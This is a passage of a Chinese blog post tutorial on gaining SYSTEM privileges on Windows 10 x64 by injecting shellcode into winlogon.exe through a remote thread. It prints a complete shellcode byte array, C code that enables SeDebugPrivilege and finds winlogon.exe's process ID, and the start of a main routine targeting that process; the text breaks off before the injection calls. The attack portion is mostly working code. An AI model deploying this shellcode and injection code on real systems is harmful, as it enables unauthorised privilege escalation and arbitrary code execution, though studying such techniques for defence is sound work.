<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>win10_x64下shellcode提权工具(SYSTEM权限) - 编程大白的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="win10_x64下shellcode提权工具(SYSTEM权限)" />
<meta property="og:description" content="之前写过一篇远线程注入与一篇shellcode编写的文章：
Win10_X64远线程注入dll(非CreateRemoteThread)
Windows 10_X64环境shellcode编写
上一次是通过远线程注入，将指定的dll模块加载进我们指定的进程，这一次将我们写好的shellcode注入进指定的进程，从而执行任意代码。
首先我们要清楚如何获取一个具有system权限的cmd，想要获取一个具有system权限的cmd，首先这个cmd得是一个具有system权限进程的子进程，windows下具有system权限的进程有：winlogon.exe、wininit.exe等，这次我们就通过对winlogon.exe进行远线程注入shellcode拿到一个system权限的cmd。
shellcode 首先明确shellcode是有一段汇编代码编写而成，然后转为机器码存在内存中然后直接从内存中去执行的数据，关于shellcode的代码编写此处不做详细介绍可以去看之前的那一篇，我们直接从用编译好的exe提取机器码的部分开始。
很多人对提取机器码都感到头疼，都觉得那是一项体力活，其实只要掌握善用动态调试工具就可以轻松的搞到机器码。
首先打开x64dbg，将我们刚刚用nasm编译好的程序拖入x64dbg
可以看到这并不是我们要的汇编代码，这些代码是由编译器生成用于将我们的程序正确被进程加载器加载的一段代码，想要找到我们的汇编代码，可以直接选中符号，然后选中我们编译好的进程，就能看到我们要找的代码了
这就是我们想要的代码也就是在上一篇文章中写好的汇编程序，现在我们来提取机器码，首先将我们写好要注入的代码全部选中，然后右击选“二进制-&gt;复制”，就可以得到我们需要的机器码
注入程序 然后来写C语言部分，这部分其实就是一个远线程注入程序。
首先将刚刚拿到的机器码拷入我们的程序源代码，因为我们需要的是十六进制数组的形式，可以利用记事本自带的替换功能，吧所有的空格替换为“,0x”即可，然后直接粘贴进程序
//shellcode机器码 unsigned char shellcode[] = { 0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x48,0x83,0xEC,0x28,0x4D,0x31,0xC0,0x48,0x31,0xC9,0x4D,0x31,0xD2,0x49,0x83, 0xC2,0x60,0x65,0x49,0x8B,0x02,0x48,0x8B,0x40,0x18,0x48,0x8B,0x70,0x20,0x48,0xAD,0x48,0x96,0x48,0xAD,0x48,0x8B, 0x58,0x20,0x4D,0x31,0xC0,0x44,0x8B,0x43,0x3C,0x48,0x31,0xD2,0x4C,0x89,0xC2,0x48,0x01,0xDA,0x48,0xC7,0xC0,0xFF, 0xFF,0xFF,0xFF,0x48,0x2D,0x77,0xFF,0xFF,0xFF,0x44,0x8B,0x04,0x02,0x49,0x01,0xD8,0x48,0x31,0xF6,0x41,0x8B,0x70, 0x20,0x48,0x01,0xDE,0x48,0x31,0xC9,0x41,0xB9,0x57,0x69,0x6E,0x45,0x48,0xFF,0xC1,0x48,0x31,0xC0,0x8B,0x04,0x8E, 0x48,0x01,0xD8,0x44,0x39,0x08,0x75,0xEF,0x48,0x31,0xF6,0x41,0x8B,0x70,0x24,0x48,0x01,0xDE,0x66,0x8B,0x0C,0x4E, 0x48,0x31,0xF6,0x41,0x8B,0x70,0x1C,0x48,0x01,0xDE,0x48,0x31,0xD2,0x8B,0x14,0x8E,0x48,0x01,0xDA,0x48,0x89,0xD7, 0x48,0xC7,0xC0,0xFF,0xFF,0xFF,0xFF,0x48,0x2D,0x9C,0x92,0x9B,0xFF,0x50,0x48,0x89,0xE1,0x48,0x31,0xD2,0x48,0x83, 0xC2,0x05,0xFF,0xD7,0x48,0x83,0xC4,0x30,0x5D,0x5F,0x5E,0x5B,0x5A,0x59,0x58,0xC3 }; 然后开始编写注入程序，首先要对我们的进程本身获得调试权限
/* 设定本进程的程序调试权限 lPcstr:权限字符串 backCode:错误返回码 */ BOOL GetDebugPrivilege( _In_ LPCSTR lPcstr, _Inout_ DWORD* backCode ) { HANDLE Token = NULL; LUID luid = { 0 }; TOKEN_PRIVILEGES Token_privileges = { 0 }; //内存初始化为zero memset(&amp;luid, 0x00, sizeof(luid)); memset(&amp;Token_privileges, 0x00, sizeof(Token_privileges)); //打开进程令牌 if (!" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://bcdabai.github.io/posts/0d4fee86566f35776970c9718a5ed2fc/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-11-22T18:08:39+08:00" />
<meta property="article:modified_time" content="2020-11-22T18:08:39+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程大白的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程大白的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">win10_x64下shellcode提权工具(SYSTEM权限)</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>之前写过一篇远线程注入与一篇shellcode编写的文章：<br> <a href="https://blog.csdn.net/weixin_43815930/article/details/108838963">Win10_X64远线程注入dll(非CreateRemoteThread)</a><br> <a href="https://blog.csdn.net/weixin_43815930/article/details/109864686">Windows 10_X64环境shellcode编写</a><br> 上一次是通过远线程注入，将指定的dll模块加载进我们指定的进程，这一次将我们写好的shellcode注入进指定的进程，从而执行任意代码。<br> 首先我们要清楚如何获取一个具有system权限的cmd，想要获取一个具有system权限的cmd，首先这个cmd得是一个具有system权限进程的子进程，windows下具有system权限的进程有：winlogon.exe、wininit.exe等，这次我们就通过对winlogon.exe进行远线程注入shellcode拿到一个system权限的cmd。</p> 
<h3><a id="shellcode_5"></a><strong>shellcode</strong></h3> 
<p>首先明确shellcode是有一段汇编代码编写而成，然后转为机器码存在内存中然后直接从内存中去执行的数据，关于shellcode的代码编写此处不做详细介绍可以去看之前的那一篇，我们直接从用编译好的exe提取机器码的部分开始。<br> 很多人对提取机器码都感到头疼，都觉得那是一项体力活，其实只要掌握善用动态调试工具就可以轻松的搞到机器码。</p> 
<p>首先打开x64dbg，将我们刚刚用nasm编译好的程序拖入x64dbg<br> <img src="https://images2.imgbox.com/db/51/VSHrMj8s_o.jpg" alt="在这里插入图片描述"><br> 可以看到这并不是我们要的汇编代码，这些代码是由编译器生成用于将我们的程序正确被进程加载器加载的一段代码，想要找到我们的汇编代码，可以直接选中<strong>符号</strong>，然后选中我们编译好的进程，就能看到我们要找的代码了<br> <img src="https://images2.imgbox.com/dc/ed/SOUlp9Gb_o.jpg" alt="在这里插入图片描述"><br> <img src="https://images2.imgbox.com/66/74/1E5Qjt3F_o.jpg" alt="在这里插入图片描述"><br> 这就是我们想要的代码也就是在上一篇文章中写好的汇编程序，现在我们来提取机器码，首先将我们写好要注入的代码全部选中，然后右击选“二进制-&gt;复制”，就可以得到我们需要的机器码<br> <img src="https://images2.imgbox.com/25/d8/hrm4hvvq_o.jpg" alt="在这里插入图片描述"></p> 
<h3><a id="_16"></a>注入程序</h3> 
<p>然后来写C语言部分，这部分其实就是一个远线程注入程序。<br> 首先将刚刚拿到的机器码拷入我们的程序源代码，因为我们需要的是十六进制数组的形式，可以利用记事本自带的替换功能，吧所有的空格替换为“,0x”即可，然后直接粘贴进程序</p> 
<pre><code class="prism language-c"><span class="token comment">//shellcode机器码</span>
<span class="token keyword">unsigned</span> <span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> 
<span class="token punctuation">{<!-- --></span>
	<span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x51</span><span class="token punctuation">,</span><span class="token number">0x52</span><span class="token punctuation">,</span><span class="token number">0x53</span><span class="token punctuation">,</span><span class="token number">0x56</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x55</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xEC</span><span class="token punctuation">,</span><span class="token number">0x28</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC9</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span>
	<span class="token number">0xC2</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span><span class="token number">0x65</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xAD</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x96</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xAD</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span>
	<span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x4D</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x43</span><span class="token punctuation">,</span><span class="token number">0x3C</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x4C</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xC2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDA</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xC7</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span>
	<span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x2D</span><span class="token punctuation">,</span><span class="token number">0x77</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x02</span><span class="token punctuation">,</span><span class="token number">0x49</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xD8</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xF6</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span>
	<span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDE</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC9</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0xB9</span><span class="token punctuation">,</span><span class="token number">0x57</span><span class="token punctuation">,</span><span class="token number">0x69</span><span class="token punctuation">,</span><span class="token number">0x6E</span><span class="token punctuation">,</span><span class="token number">0x45</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xC1</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x04</span><span class="token punctuation">,</span><span class="token number">0x8E</span><span class="token punctuation">,</span>
	<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xD8</span><span class="token punctuation">,</span><span class="token number">0x44</span><span class="token punctuation">,</span><span class="token number">0x39</span><span class="token punctuation">,</span><span class="token number">0x08</span><span class="token punctuation">,</span><span class="token number">0x75</span><span class="token punctuation">,</span><span class="token number">0xEF</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xF6</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x24</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDE</span><span class="token punctuation">,</span><span class="token number">0x66</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x0C</span><span class="token punctuation">,</span><span class="token number">0x4E</span><span class="token punctuation">,</span>
	<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xF6</span><span class="token punctuation">,</span><span class="token number">0x41</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x70</span><span class="token punctuation">,</span><span class="token number">0x1C</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDE</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x8B</span><span class="token punctuation">,</span><span class="token number">0x14</span><span class="token punctuation">,</span><span class="token number">0x8E</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x01</span><span class="token punctuation">,</span><span class="token number">0xDA</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xD7</span><span class="token punctuation">,</span>
	<span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0xC7</span><span class="token punctuation">,</span><span class="token number">0xC0</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x2D</span><span class="token punctuation">,</span><span class="token number">0x9C</span><span class="token punctuation">,</span><span class="token number">0x92</span><span class="token punctuation">,</span><span class="token number">0x9B</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x89</span><span class="token punctuation">,</span><span class="token number">0xE1</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x31</span><span class="token punctuation">,</span><span class="token number">0xD2</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span>
	<span class="token number">0xC2</span><span class="token punctuation">,</span><span class="token number">0x05</span><span class="token punctuation">,</span><span class="token number">0xFF</span><span class="token punctuation">,</span><span class="token number">0xD7</span><span class="token punctuation">,</span><span class="token number">0x48</span><span class="token punctuation">,</span><span class="token number">0x83</span><span class="token punctuation">,</span><span class="token number">0xC4</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">,</span><span class="token number">0x5D</span><span class="token punctuation">,</span><span class="token number">0x5F</span><span class="token punctuation">,</span><span class="token number">0x5E</span><span class="token punctuation">,</span><span class="token number">0x5B</span><span class="token punctuation">,</span><span class="token number">0x5A</span><span class="token punctuation">,</span><span class="token number">0x59</span><span class="token punctuation">,</span><span class="token number">0x58</span><span class="token punctuation">,</span><span class="token number">0xC3</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
</code></pre> 
<p>然后开始编写注入程序，首先要对我们的进程本身获得调试权限</p> 
<pre><code class="prism language-c"><span class="token comment">/*
设定本进程的程序调试权限
lPcstr:权限字符串
backCode:错误返回码
*/</span>
BOOL <span class="token function">GetDebugPrivilege</span><span class="token punctuation">(</span>
_In_ LPCSTR lPcstr<span class="token punctuation">,</span>
_Inout_ DWORD<span class="token operator">*</span> backCode
<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	HANDLE Token <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	LUID luid <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	TOKEN_PRIVILEGES Token_privileges <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token comment">//内存初始化为zero</span>
	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>luid<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>luid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>Token_privileges<span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Token_privileges<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//打开进程令牌</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">OpenProcessToken</span><span class="token punctuation">(</span><span class="token function">GetCurrentProcess</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> TOKEN_QUERY <span class="token operator">|</span> TOKEN_ADJUST_PRIVILEGES<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Token<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//获取特权luid</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">LookupPrivilegeValue</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span>lPcstr<span class="token punctuation">,</span><span class="token operator">&amp;</span>luid<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x02</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//设定结构体luid与特权</span>
	Token_privileges<span class="token punctuation">.</span>PrivilegeCount <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
	Token_privileges<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Luid <span class="token operator">=</span> luid<span class="token punctuation">;</span>
	Token_privileges<span class="token punctuation">.</span>Privileges<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>Attributes <span class="token operator">=</span> SE_PRIVILEGE_ENABLED<span class="token punctuation">;</span>

	<span class="token comment">//修改进程特权</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">AdjustTokenPrivileges</span><span class="token punctuation">(</span>Token<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>Token_privileges<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TOKEN_PRIVILEGES<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x03</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>然后我们还需要一个函数用来获取进程快照，然后遍历获取找到我们指定的进程并获取其pid</p> 
<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">GetProcessPid</span><span class="token punctuation">(</span>
	_In_ <span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> ProcessName<span class="token punctuation">,</span>
	_Inout_ DWORD<span class="token operator">*</span> backCode
<span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	PROCESSENTRY32 P32 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	HANDLE H32 <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	<span class="token comment">//内存初始化为zeor</span>
	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>P32<span class="token punctuation">,</span> <span class="token number">0X00</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>P32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//创建快照</span>
	H32 <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	P32<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>P32<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>H32 <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token comment">//开始循环遍历进程</span>
	BOOL ret <span class="token operator">=</span> <span class="token function">Process32First</span><span class="token punctuation">(</span>H32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>P32<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span> <span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token comment">//发现指定进程存在</span>
		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>P32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">,</span> ProcessName<span class="token punctuation">)</span><span class="token punctuation">)</span>
		<span class="token punctuation">{<!-- --></span>
			<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
			<span class="token keyword">return</span> P32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span>
		<span class="token punctuation">}</span>
		ret <span class="token operator">=</span> <span class="token function">Process32Next</span><span class="token punctuation">(</span>H32<span class="token punctuation">,</span> <span class="token operator">&amp;</span>P32<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token operator">*</span>backCode <span class="token operator">=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
	<span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>下面开始编写主程序，</p> 
<ol><li>首先自然是调用上面第一个函数获取调试权限（这一步省略好像也没关系，在我的机器上是这样）。</li><li>然后调用第二个函数获取winlogon.exe的进程id。</li><li>根据pid打开进程</li><li>使用VirtualAllocEx函数在我们打开的进程中申请内存</li><li>使用WriteProcessMemory函数将我们的shellcode写进刚刚申请得到的虚拟内存中</li><li>通过加载ntdll.dll动态库获取到内核函数ZwCreateThreadEx并使用</li><li>调用ZwCreateThreadEx函数创建远线程，执行我们的shellcode</li><li>一些善后处理，该释放的释放该退出的退出</li></ol> 
<pre><code class="prism language-c"><span class="token comment">/*
主函数
*/</span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argv<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argc<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
	<span class="token comment">//对必要的变量进行声明以及初始化</span>
	DWORD backCode <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	HANDLE hProcess <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	LPVOID Buff <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	HMODULE Ntdll <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
	SIZE_T write_len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	DWORD dwStatus <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
	HANDLE hRemoteThread <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>

	<span class="token comment">//通过进程名获取pid</span>
	<span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">GetProcessPid</span><span class="token punctuation">(</span><span class="token string">"winlogon.exe"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>backCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"pid get error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//提升进程特权，获得调试权限</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">GetDebugPrivilege</span><span class="token punctuation">(</span>SE_DEBUG_NAME<span class="token punctuation">,</span> <span class="token operator">&amp;</span>backCode<span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">{<!-- --></span>
		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"DBG privilege error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">" %d"</span><span class="token punctuation">,</span> backCode<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token comment">//打开要被注入的进程</span>
